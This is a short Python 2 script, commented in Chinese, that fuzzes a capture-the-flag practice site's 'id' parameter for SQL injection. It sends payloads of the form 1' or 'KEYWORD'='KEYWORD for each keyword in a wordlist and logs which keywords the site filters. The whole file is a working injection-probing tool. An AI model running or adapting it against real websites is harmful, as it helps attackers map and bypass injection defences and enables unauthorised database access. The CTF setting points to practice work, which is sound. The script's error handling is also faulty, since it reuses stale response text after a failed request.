# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time

url='http://ctf5.shiyanbar.com/423/web/?id=';
#定义语法关键字测试使用的载荷库
f = file("availible_word_result.txt", "w+")
filename="dict/关键字/sql注入常见关键字.txt"
uipath = unicode(filename, "utf8")
keyword=''
connectword='or'
for line in open(uipath):
    line=line.replace("\n","")
    # time.sleep(0.5)
    #url格式要从string转换为url格式,这里主要指空格，如果不改抓包分析url为第一个空格前的所有字符串
    try:
        keyword=line
        print url + "1"+quote("' ")+connectword+ quote(" '")+keyword+quote("'='")+keyword
        req = urllib2.Request(url + "1"+quote("' ")+connectword+ quote(" '")+keyword+quote("'='")+keyword)
        # print 'req is already: ' + url + quote("1' " + line + " '1'='1")
        res = urllib2.urlopen(req,data=None,timeout=1)
        # print 'res is already '
        text=res.read()
    except IOError:
        print "Error: 异常出现,开始重试"
    # print line
    # print line.swapcase()
    if(text.find(line.swapcase())<0):
        print line+'被过滤了!'
        f.writelines('keyword:'+line+'\n'+'URL:'+req.get_full_url()+'\n'+'content:'+"\n"+text+"\n")
        # print line+'通过了!'
    # else:
    #     if (text.find(" '"+keyword+"'='"+keyword) < 0):
    #         print keyword + '被过滤了!'
    #         f.writelines(
    #             'keyword:' + keyword + '\n' + 'URL:' + req.get_full_url() + '\n' + 'content:' + "\n" + text + "\n")
    #     # print line + '通过了!'
f.close()

